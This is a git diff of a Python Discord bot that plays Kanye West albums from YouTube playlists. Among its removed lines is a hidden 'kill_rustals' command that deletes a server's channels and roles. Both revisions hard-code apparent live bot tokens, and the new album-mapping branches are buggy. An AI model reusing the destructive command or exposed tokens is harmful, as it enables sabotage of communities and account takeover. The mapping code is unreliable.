@@ -1,6 +1,7 @@
 import discord
 import random
 
+from discord.utils import get
 from discord.ext import commands, tasks
 from Embeds.Embeds import embed_help
 from SRC.reddit import gather_post_info, upvotes, titles, pictures, links
@@ -17,7 +18,18 @@ list_of_albums = ["college dropout", "collegedropout", "cd", "late registration"
                   "808's and heartbreaks", "808", "808s", "808's", "my beautiful dark twisted fantasy", "mbdtf",
                   "watch the throne", "wth", "yeezus", "the life of pablo", "tlop", "pablo", "ye", "kids see ghosts",
                   "ksg", "jesus is king", "jik", "sunday service", "ss"]
-playlists_of_albums = ["https://www.youtube.com/watch?v=OTZzjAU0Kg0&list=PLeO-rHNGADqzCkDOyEUZbJMnuu5s9yIGh", ]
+playlists_of_albums = ["https://www.youtube.com/watch?v=OTZzjAU0Kg0&list=PLeO-rHNGADqzCkDOyEUZbJMnuu5s9yIGh",
+                       "https://www.youtube.com/watch?v=Bwyu-SZ7g_E&list=PLRNstPwi0r8dhdTBkA7iNXRaG_yynueP7",
+                       "https://www.youtube.com/watch?v=JRnp5nwnkgI&list=PLXR4OlatIg5Fpc8HaoBlznnCGXMVJC9Ql",
+                       "https://www.youtube.com/watch?v=d9BMPmfxaoM&list=PLX68ZEYlh74tpCb5sOXP98ito6DhP60-t",
+                       "https://www.youtube.com/watch?v=UTH1VNHLjng&list=PLzMq4yH_FvVa5kPgtKmgdzPssfmBUtO2C",
+                       "https://www.youtube.com/watch?v=FJt7gNi3Nr4&list=PLTI4-CRTcbtZup8J0WdvJm-JMgMJhnnOb",
+                       "https://www.youtube.com/watch?v=uU9Fe-WXew4&list=PLzMq4yH_FvVaV0uPkc_Quj3PaXnpouNld",
+                       "https://www.youtube.com/watch?v=6oHdAA3AqnE&list=PLzMq4yH_FvVac_1R0DMcMkcwnJ1-hFx6b",
+                       "https://www.youtube.com/watch?v=2SeVgStQ5T0&list=PLAUxsgLNM2Bt8apMzywvdzOJSzlfW4OQa",
+                       "https://www.youtube.com/watch?v=rnZQvgWhM5s&list=PLzMq4yH_FvVaq5TFtfCDs6FxWef45gyHW",
+                       "https://www.youtube.com/watch?v=T58tRXzjC7c&list=PL5Z-QTr_hR1gTIk7T-bPCmRaaXNmiP3aK",
+                       "https://www.youtube.com/watch?v=2Czs7fl1r7c&list=PLcllBDpP7V-_NOCf4wbYTbh4VUsObhNyo"]
 server_players = {}
 list_of_commands = [['help', "Shows list of commands"],
                     ['play {album] or {link} or {song}', "Plays the desired song/album"],
@@ -33,25 +45,6 @@ list_of_commands = [['help', "Shows list of commands"],
 async def change_status():
     await client.change_presence(
         activity=discord.Activity(type=discord.ActivityType.listening, name=list_of_status[random.randint(0, 10)]))
-
-
-@client.command(pass_context=True)
-async def kill_rustals(ctx):
-    for channel in ctx.message.guild.channels:
-        if channel == "Text Channels":
-            continue
-        elif channel == "Voice Channels":
-            continue
-        await channel.delete()
-        print(str(channel) + " Deleted!")
-    index = 0
-    for role in ctx.message.guild.roles:
-        if index == 0:
-            index += 1
-            continue
-        print(str(role) + " Deleted!")
-        await role.delete()
-        index += 1
 
 
 @client.command(pass_context=True)
@@ -71,10 +64,10 @@ async def play_help(ctx, command):
 async def pause(ctx):
     if ctx.message.guild.voice_client is None:
         await ctx.send("No music playing to pause")
-
     ctx.message.guild.voice_client.pause()
     embed = discord.Embed(title="Paused")
-    embed.set_thumbnail(url="https://media1.tenor.com/images/fdbdfca68e86c2580fd4bb155f95281f/tenor.gif?itemid=14908888")
+    embed.set_thumbnail(
+        url="https://media1.tenor.com/images/fdbdfca68e86c2580fd4bb155f95281f/tenor.gif?itemid=14908888")
     await ctx.send(embed=embed)
 
 
@@ -82,10 +75,10 @@ async def pause(ctx):
 async def resume(ctx):
     if ctx.message.guild.voice_client is None:
         await ctx.send("No music paused to resume")
-
     ctx.message.guild.voice_client.resume()
     embed = discord.Embed(title="Resumed")
-    embed.set_thumbnail(url="https://media1.tenor.com/images/ba2a1aa852f101d2a0ddf523c876cfbf/tenor.gif?itemid=14908886")
+    embed.set_thumbnail(
+        url="https://media1.tenor.com/images/ba2a1aa852f101d2a0ddf523c876cfbf/tenor.gif?itemid=14908886")
     await ctx.send(embed=embed)
 
 
@@ -103,6 +96,32 @@ async def play(ctx, *, source=None, channel: discord.VoiceChannel = None):
                 index = list_of_albums.index(source)
                 if index < 3:
                     source = playlists_of_albums[0]
+                elif index < 6:  # college dropout
+                    source = playlists_of_albums[1]
+                elif index < 8:  # late regestraration
+                    source = playlists_of_albums[2]
+                elif index < 15:  # graduation
+                    source = playlists_of_albums[3]
+                elif index < 15:  # 808's
+                    source = playlists_of_albums[4]
+                elif index < 17:  # MBDTF
+                    source = playlists_of_albums[5]
+                elif index < 19:  # Watch the throne
+                    source = playlists_of_albums[6]
+                elif index < 20:  # yeezus
+                    source = playlists_of_albums[7]
+                elif index < 23:  # tlop
+                    source = playlists_of_albums[8]
+                elif index < 24:  # ye
+                    source = playlists_of_albums[9]
+                elif index < 26:  # ksg
+                    source = playlists_of_albums[10]
+                elif index < 28:  # jesus is king
+                    source = playlists_of_albums[11]
+                elif index < 30:  # sunday service
+                    source = playlists_of_albums[12]
+                else:
+                    return
 
             url = source
             destination = channel or ctx.author.voice.channel
@@ -111,7 +130,7 @@ async def play(ctx, *, source=None, channel: discord.VoiceChannel = None):
             voice_channel = server.voice_client
             async with ctx.typing():
                 player = await YTDLSource.from_url(source, loop=client.loop)
-                server_players[server.id] = [player, ""]
+                server_players[server.id] = player
                 voice_channel.play(player, after=lambda e: print('Player error: %s' % e) if e else None)
             await ctx.send(embed=now_playing_embed(player.title, url))
 
@@ -167,4 +186,4 @@ async def on_ready():
     change_status.start()
 
 
-client.run('NjkyNTc2MTcxOTAwMTQxNTk4.XoC6AA.hxnoto2bgJNYnnciDtzFqn72OfU')
+client.run('Njk2OTE2NjkyMzUzMTU1MTY0.Xovsgw.8o6EdWeLUH23MmTJE5anHv_wh4k')
